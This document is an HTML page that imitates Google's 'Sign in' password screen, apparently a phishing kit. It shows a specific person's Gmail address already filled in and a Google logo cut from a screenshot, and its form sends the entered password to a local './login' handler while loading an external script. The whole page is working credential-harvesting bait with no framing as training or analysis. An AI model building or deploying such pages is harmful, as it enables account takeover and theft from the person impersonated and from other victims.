<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in - Google Accounts</title>
  <style>
    body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background: #f2f2f2;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}

.main-container {
  display: flex;
  width: 800px;
  background: #fff;
  border-radius: 20px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.15);
  overflow: hidden;
}

/* LEFT SIDE */
.left-panel {
  flex: 1;
  padding: 40px;
  background: #fff;
}

.logo {
   margin-bottom: 0px;
  width: 50px;
  height: 50px;
}

.left-panel h1 {
  font-size: 24px;
  font-weight: 400;
  margin-bottom: 8px;
}

.email-display {
  font-size: 14px;
  color: #5f6368;
}

/* RIGHT SIDE */
.right-panel {
  flex: 1;
  padding: 40px;
  background: #fff;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}

form {
  display: flex;
  flex-direction: column;
}

label {
  font-size: 14px;
  margin-bottom: 6px;
}

input[type="password"] {
  padding: 12px;
  font-size: 14px;
  border: 1px solid #dadce0;
  border-radius: 6px;
  margin-bottom: 12px;
}

.show-password {
  display: flex;
  align-items: center;
  font-size: 14px;
  margin-bottom: 16px;
}

.show-password input {
  margin-right: 8px;
}

.options {
  margin-bottom: 24px;
}

.options a {
  font-size: 14px;
  color: #1a73e8;
  text-decoration: none;
}

.options a:hover {
  text-decoration: underline;
}

.button-row {
  display: flex;
  justify-content: flex-end;
}
.footer-links a:hover {
  text-decoration: underline;
}

select {
  font-size: 12px;
  padding: 4px;
}
  </style>
</head>
<body>

  <div class="main-container">

    <div class="left-panel">
      <img src="Screenshot_2026-01-26_224339-removebg-preview.png" alt="Google logo" class="logo">
      <h1>Welcome</h1>
      <p class="email-display">mwansipene@gmail.com</p>
    </div>

    <div class="right-panel">
      <form action="./login" method="post">
        <label for="password">Enter your password</label>
        <input type="password" name="password" id="password" required>

        <div class="show-password">
          <input type="checkbox" id="show">
          <label for="show">Show password</label>
        </div>

        <div class="options">
          <a href="#">Try another way</a>
        </div>

        <div class="button-row">
          <button type="submit">Next</button>
        </div>
      </form>

      <div class="footer">
        <div class="footer-links">
          <a href="#">Help</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
        </div>
        <select id="luke" name="luke">
          <option>English (United States)</option>
          <option>Español</option>
          <option>Français</option>
        </select>
       </div>
    </div>

  </div>
 <script src="script.js"></script>
</body>
</html>
